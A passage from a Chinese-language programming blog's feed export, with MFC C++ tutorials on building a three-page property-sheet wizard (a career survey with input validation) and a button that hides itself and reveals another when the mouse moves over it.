class="keyword">return</span> TRUE;  <span class="comment">// return TRUE unless you set the focus to a control</span></span><br><span class="line">  <span class="comment">// 异常: OCX 属性页应返回 FALSE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取控件最快的就是用指针。</p><p><code>CListBox* pListBox = (CListBox*)GetDlgItem(IDC_LIST_COMPANY);</code><br>因为这个控件是我们拖得，所以我们很清楚它是什么类型，但是别人不一定清楚。<br>而且GetDlgItem的返回类型是CWnd，但是好在CListBox是它的子类。所以直接强制转换一下。<br>获取完成后，就可以通过指针给他增加点字符串</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">PROP_01::OnInitDialog</span><span class="params">()</span></span>&#123;</span><br><span class="line">CPropertyPage::<span class="built_in">OnInitDialog</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span>  在此添加额外的初始化</span></span><br><span class="line">CListBox* pListBox = (CListBox*)<span class="built_in">GetDlgItem</span>(IDC_LIST_COMPANY);</span><br><span class="line"><span class="keyword">if</span>( pListBox )&#123;</span><br><span class="line">pListBox-&gt;<span class="built_in">AddString</span>(_T(<span class="string">&quot;阿里巴巴&quot;</span>));</span><br><span class="line">pListBox-&gt;<span class="built_in">AddString</span>(_T(<span class="string">&quot;华为&quot;</span>));</span><br><span class="line">pListBox-&gt;<span class="built_in">AddString</span>(_T(<span class="string">&quot;腾讯&quot;</span>));</span><br><span class="line">pListBox-&gt;<span class="built_in">AddString</span>(_T(<span class="string">&quot;百度&quot;</span>));</span><br><span class="line">pListBox-&gt;<span class="built_in">AddString</span>(_T(<span class="string">&quot;京东&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// return TRUE unless you set the focus to a control</span></span><br><span class="line">  <span class="comment">// 异常: OCX 属性页应返回 FALSE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样这个对话框就ok了</p><hr><img src="/2022/08/03/nDialog/006.png" class=""><p>再次创建新的对话框，拖动check box组合一下</p><p>同样的给这个对话框创建一个类，步骤也是从类向导开始，注意命名规范。</p><p>最后就是复选框添加变量，跟radio差不多的路数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">// 技能选项</span></span><br><span class="line">BOOL m_skill[<span class="number">4</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后在源文件同样通过memset写0，和后面的绑定</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PROP_02::<span class="built_in">PROP_02</span>()</span><br><span class="line">: <span class="built_in">CPropertyPage</span>(IDD_PROP_02)&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(m_skill, <span class="number">0</span>, <span class="built_in">sizeof</span>(m_skill));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PROP_02::~<span class="built_in">PROP_02</span>()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PROP_02::DoDataExchange</span><span class="params">(CDataExchange* pDX)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CPropertyPage::<span class="built_in">DoDataExchange</span>(pDX);</span><br><span class="line"><span class="built_in">DDX_Check</span>(pDX, IDC_CHECK1, m_skill[<span class="number">0</span>]);<span class="comment">//网络编程</span></span><br><span class="line"><span class="built_in">DDX_Check</span>(pDX, IDC_CHECK2, m_skill[<span class="number">1</span>]);<span class="comment">//MFC</span></span><br><span class="line"><span class="built_in">DDX_Check</span>(pDX, IDC_CHECK3, m_skill[<span class="number">2</span>]);<span class="comment">//操作系统</span></span><br><span class="line"><span class="built_in">DDX_Check</span>(pDX, IDC_CHECK4, m_skill[<span class="number">3</span>]);<span class="comment">//数据结构</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这么一来这个对话框界面也就ok了。</p><p>可能稍微为了好看就要注意一下这几个对话框大小</p><img src="/2022/08/03/nDialog/007.png" class=""><p>选中这个dialog的时候vs的下面会显示，手动调整一下</p><hr><img src="/2022/08/03/nDialog/008.png" class=""><p>至于这个也不做多解释了，创建的路数都一样。</p><p>唯一需要注意的是这个下拉多选的控件是<code>combo box</code></p><img src="/2022/08/03/nDialog/009.png" class=""><p>数据使用分号分割，注意要英语符合。</p><hr><p>最后三个对话框都创建好了，自然需要关联起来。</p><img src="/2022/08/03/nDialog/010.png" class=""><p>对这个项目创建一个MFC类。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CMyProSheet</span>(UINT nIDCaption, CWnd* pParentWnd = <span class="literal">nullptr</span>, UINT iSelectPage = <span class="number">0</span>);</span><br><span class="line"><span class="built_in">CMyProSheet</span>(LPCTSTR pszCaption, CWnd* pParentWnd = <span class="literal">nullptr</span>, UINT iSelectPage = <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>这两个构造函数可以看到就头不一样，UINT也就是unsigned int，下面那个也就是字符串<br>不过既然有俩了，那有啥改动就尽量都保持一样</p><p>然后添加一下我们三个对话框类</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>:</span><br><span class="line">PROP_01 m_prop1;</span><br><span class="line">PROP_02 m_prop2;</span><br><span class="line">PROP_03 m_prop3;</span><br></pre></td></tr></table></figure><p>在源文件中构造的时候添加这三个页</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CMyProSheet::<span class="built_in">CMyProSheet</span>(UINT nIDCaption, CWnd* pParentWnd, UINT iSelectPage)</span><br><span class="line">:<span class="built_in">CPropertySheet</span>(nIDCaption, pParentWnd, iSelectPage)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">AddPage</span>(&amp;m_prop1);</span><br><span class="line"><span class="built_in">AddPage</span>(&amp;m_prop2);</span><br><span class="line"><span class="built_in">AddPage</span>(&amp;m_prop3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CMyProSheet::<span class="built_in">CMyProSheet</span>(LPCTSTR pszCaption, CWnd* pParentWnd, UINT iSelectPage)</span><br><span class="line">:<span class="built_in">CPropertySheet</span>(pszCaption, pParentWnd, iSelectPage)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">AddPage</span>(&amp;m_prop1);</span><br><span class="line"><span class="built_in">AddPage</span>(&amp;m_prop2);</span><br><span class="line"><span class="built_in">AddPage</span>(&amp;m_prop3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么这几个页是组合到一起了。剩下就是写那个按钮事件了。</p><p>额尴尬，跑的时候有个问题，就是单选按钮没有组，然后抛出异常了</p><img src="/2022/08/03/nDialog/011.png" class=""><p>修改一下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PROP_01::<span class="built_in">PROP_01</span>()</span><br><span class="line">: <span class="built_in">CPropertyPage</span>(IDD_PROP_01)</span><br><span class="line">, <span class="built_in">m_lang</span>(<span class="number">-1</span>)&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PROP_01::~<span class="built_in">PROP_01</span>()&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PROP_01::DoDataExchange</span><span class="params">(CDataExchange* pDX)</span></span>&#123;</span><br><span class="line">CPropertyPage::<span class="built_in">DoDataExchange</span>(pDX);</span><br><span class="line"><span class="built_in">DDX_Radio</span>(pDX, IDC_RADIO_CPP, m_lang);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改完之后跑起来就ok了</p><img src="/2022/08/03/nDialog/012.png" class=""><img src="/2022/08/03/nDialog/013.png" class=""><img src="/2022/08/03/nDialog/014.png" class=""><p>因为设置的大小差不多，比较和谐。</p><hr><p>稍微有心的可能会注意到，那个帮助不一定需要，按照前面重载按钮类的示例，这边也就能重写</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">PROP_01::OnSetActive</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加专用代码和/或调用基类</span></span><br><span class="line"></span><br><span class="line">((CPropertySheet*)<span class="built_in">GetParent</span>())-&gt;<span class="built_in">SetWizardButtons</span>(PSWIZB_NEXT);</span><br><span class="line">((CPropertySheet*)<span class="built_in">GetParent</span>())-&gt;<span class="built_in">GetDlgItem</span>(IDHELP)-&gt;<span class="built_in">ShowWindow</span>(SW_HIDE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CPropertyPage::<span class="built_in">OnSetActive</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">PROP_02::OnSetActive</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加专用代码和/或调用基类</span></span><br><span class="line">((CPropertySheet*)<span class="built_in">GetParent</span>())-&gt;<span class="built_in">SetWizardButtons</span>(PSWIZB_NEXT | PSWIZB_BACK);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CPropertyPage::<span class="built_in">OnSetActive</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">PROP_03::OnSetActive</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加专用代码和/或调用基类</span></span><br><span class="line">((CPropertySheet*)<span class="built_in">GetParent</span>())-&gt;<span class="built_in">SetWizardButtons</span>(PSWIZB_BACK | PSWIZB_FINISH);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> CPropertyPage::<span class="built_in">OnSetActive</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个对话框，只显示下一步，上一步无法点击，并且隐藏帮助按钮<br>第二个对话框则上下都可行<br>第三个对话框只能向上一步和完成。</p><img src="/2022/08/03/nDialog/015.png" class=""><img src="/2022/08/03/nDialog/016.png" class=""><img src="/2022/08/03/nDialog/017.png" class=""><hr><p>说到底还是个半成品，还有很多能优化的地方。<br>比如校验，目前这个即便不选择，也可以直接next。</p><p>所以要重写两个next，最后一个因为变成完成了，所以要重写的是finish</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT <span class="title">PROP_01::OnWizardNext</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加专用代码和/或调用基类</span></span><br><span class="line"><span class="built_in">UpdateData</span>();</span><br><span class="line"><span class="keyword">if</span>( m_lang == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;请选择开发语言!&quot;</span>), _T(<span class="string">&quot;开发语言未选择&quot;</span>), MB_OK | MB_ICONERROR);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( m_company.<span class="built_in">GetLength</span>() == <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;请选择公司!&quot;</span>), _T(<span class="string">&quot;公司未选择&quot;</span>), MB_OK | MB_ICONERROR);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CPropertyPage::<span class="built_in">OnWizardNext</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT <span class="title">PROP_02::OnWizardNext</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加专用代码和/或调用基类</span></span><br><span class="line"><span class="built_in">UpdateData</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( (m_skill[<span class="number">0</span>] + m_skill[<span class="number">1</span>] + m_skill[<span class="number">2</span>] + m_skill[<span class="number">3</span>]) == <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;请选择技能!&quot;</span>), _T(<span class="string">&quot;技能未选择&quot;</span>), MB_OK | MB_ICONERROR);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CPropertyPage::<span class="built_in">OnWizardNext</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">PROP_03::OnWizardFinish</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加专用代码和/或调用基类</span></span><br><span class="line"><span class="built_in">UpdateData</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( m_money.<span class="built_in">GetLength</span>() &lt;= <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;请选择薪资!&quot;</span>), _T(<span class="string">&quot;薪资未选择&quot;</span>), MB_OK | MB_ICONERROR);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CPropertyPage::<span class="built_in">OnWizardFinish</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>记得获取前肯定要更新一下数据</strong></p><p>这套流程结束了之后，还要给用户一个反馈。</p><p>也只能加载打开按钮的地方</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CRunningButtonDlg::OnBnClickedBtnQuery</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="function">CMyProSheet <span class="title">dlg</span><span class="params">(_T(<span class="string">&quot;职业调查&quot;</span>), <span class="keyword">this</span>)</span></span>;</span><br><span class="line">dlg.<span class="built_in">SetWizardMode</span>();</span><br><span class="line"><span class="keyword">if</span>( ID_WIZFINISH == dlg.<span class="built_in">DoModal</span>() )&#123;</span><br><span class="line">CString strMsg = _T(<span class="string">&quot;您的选择是: &quot;</span>);</span><br><span class="line"><span class="keyword">switch</span>( dlg.m_prop1.m_lang )&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">strMsg += _T(<span class="string">&quot;开发语言: C++&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">strMsg += _T(<span class="string">&quot;开发语言: Java&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">strMsg += _T(<span class="string">&quot;开发语言: Python&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">strMsg += _T(<span class="string">&quot;您的公司是: &quot;</span>) + dlg.m_prop1.m_company;</span><br><span class="line">strMsg += _T(<span class="string">&quot;您的技能有：&quot;</span>);</span><br><span class="line">CString strSkill[<span class="number">4</span>] = &#123;</span><br><span class="line">_T(<span class="string">&quot;网络编程&quot;</span>), _T(<span class="string">&quot;MFC&quot;</span>), _T(<span class="string">&quot;操作系统&quot;</span>), _T(<span class="string">&quot;数据结构&quot;</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++ )&#123;</span><br><span class="line"><span class="keyword">if</span>( dlg.m_prop2.m_skill[i] )&#123;</span><br><span class="line">strMsg += strSkill[i] + _T(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">strMsg += _T(<span class="string">&quot;您的薪资范围选择是：&quot;</span>) + dlg.m_prop3.m_money;</span><br><span class="line"><span class="built_in">MessageBox</span>(strMsg, _T(<span class="string">&quot;最终选择&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/08/03/nDialog/018.png" class=""><p>选择完之后就是这样的显示。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><img src="/2022/08/03/nDialog/019.png" class=""><p>主体对话框是RunningButtonDlg，通过按钮控件，显示出CMyPropSheet。然后写好的三个页与其关联。</p>]]></content>
      
      
      
        <tags>
            
            <tag> MFC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>丐版逃跑按钮</title>
      <link href="/2022/08/02/escapeButton/"/>
      <url>/2022/08/02/escapeButton/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>就是窗口上有个按钮，然后鼠标过去按钮就移动。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>新建MFC项目<br>选中基于对话框<br>用户界面的东西基本用不到<br>高级功能打印也用不到<br>其它都正常创建</p><hr><blockquote><p>核心思想跟网上流传的网页版本可能有区别吧，这个原理就是两个按钮，当发现鼠标要触碰到这个按钮就隐藏这个，启用另一个。</p></blockquote><hr><p>首先就是拖俩button控件</p><img src="/2022/08/02/escapeButton/000.png" class=""><p>然后将左边的按钮属性中  可见 这一属性设为FALSE</p><img src="/2022/08/02/escapeButton/001.png" class=""><p>那么跑起来的效果就是这样的，看不到左边</p><img src="/2022/08/02/escapeButton/002.png" class=""><p>然后给这两个控件添加变量,[过程不做演示了，mfc用多了就习惯了]</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    CButton m_btn_right;</span><br><span class="line">    CButton m_btn_left;</span><br></pre></td></tr></table></figure><p>对于对话框而言，能第一时间想到触碰按钮的消息，也就是跟鼠标移动有关的。<br>那么显然是有这么一个消息的<code>OnMouseMove</code></p><p>添加完之后</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CRunningButtonDlg::OnMouseMove</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">CRect left, right;</span><br><span class="line">m_btn_right.<span class="built_in">GetWindowRect</span>(right);</span><br><span class="line"><span class="keyword">if</span>(right.<span class="built_in">PtInRect</span>(point) == TRUE)&#123;</span><br><span class="line">m_btn_right.<span class="built_in">ShowWindow</span>(SW_HIDE);</span><br><span class="line">m_btn_left.<span class="built_in">ShowWindow</span>(SW_SHOW);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CDialogEx::<span class="built_in">OnMouseMove</span>(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理也简单，就是当鼠标移动到这个控件上的时候，就隐藏right按钮，显示left按钮。</p><p>不过在实际run的时候会发现并没有起作用。<br>遇事不决可以添加调试的代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CRunningButtonDlg::OnMouseMove</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">CRect left, right;</span><br><span class="line">m_btn_right.<span class="built_in">GetWindowRect</span>(right);</span><br><span class="line"><span class="keyword">if</span>(right.<span class="built_in">PtInRect</span>(point) == TRUE)&#123;</span><br><span class="line">m_btn_right.<span class="built_in">ShowWindow</span>(SW_HIDE);</span><br><span class="line">m_btn_left.<span class="built_in">ShowWindow</span>(SW_SHOW);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):%s %d %d\n&quot;</span>, __FILE__, __LINE__,</span><br><span class="line">__FUNCTION__, point.x, point.y);</span><br><span class="line"></span><br><span class="line">CDialogEx::<span class="built_in">OnMouseMove</span>(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/08/02/escapeButton/003.png" class=""><p>可以看到只要鼠标是在这个对话框上移动，xy就会不断发生变化，但是当鼠标进入控件的时候，xy就不会输出了。</p><p>原因在于这个消息被按钮控件接收了，判断那里就没法用了，所以对话框无法知道这个鼠标到哪了<br>所以通过鼠标移动消息无法实现这个效果。</p><hr><p>解决方式需要重载这个按钮类。</p><p>右击资源视图的项目，选择类向导，在添加类的箭头点击选择MFC类，基类选择为CButton就行，其它的头文件和源文件命名方式看个人习惯吧。</p><p>新建完之后照例打开类视图选择这个新建的类，然后在属性中找到消息，继续选择<code>MouseMove</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyButton::OnMouseMove</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"><span class="built_in">ShowWindow</span>(SW_HIDE);</span><br><span class="line"><span class="keyword">if</span>(m_pButton != <span class="literal">NULL</span>)&#123;</span><br><span class="line">m_pButton-&gt;<span class="built_in">ShowWindow</span>(SW_SHOW);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CButton::<span class="built_in">OnMouseMove</span>(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后修改RunningButtonDlg.h</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;CMyButton.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    CMyButton m_btn_right;</span><br><span class="line">    CMyButton m_btn_left;</span><br></pre></td></tr></table></figure><p>将这个按钮改为我们重载之后的按钮类型。</p><p>最后在RunningButtonDlg.cpp中初始化的地方关联这两个按钮</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CRunningButtonDlg::OnInitDialog</span><span class="params">()</span></span>&#123;</span><br><span class="line">CDialogEx::<span class="built_in">OnInitDialog</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动</span></span><br><span class="line"><span class="comment">//  执行此操作</span></span><br><span class="line"><span class="built_in">SetIcon</span>(m_hIcon, TRUE);<span class="comment">// 设置大图标</span></span><br><span class="line"><span class="built_in">SetIcon</span>(m_hIcon, FALSE);<span class="comment">// 设置小图标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加额外的初始化代码</span></span><br><span class="line">m_btn_left.m_pButton = &amp;m_btn_right;</span><br><span class="line">m_btn_right.m_pButton = &amp;m_btn_left;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// 除非将焦点设置到控件，否则返回 TRUE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>对话框中的OnMouseMove可以注释掉了</p></blockquote><p>至此效果就完成了。</p><img src="/2022/08/02/escapeButton/004.png" class=""><img src="/2022/08/02/escapeButton/005.png" class=""><p>鼠标移动到其中一个按钮，就会立马hide，然后另一个show。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" 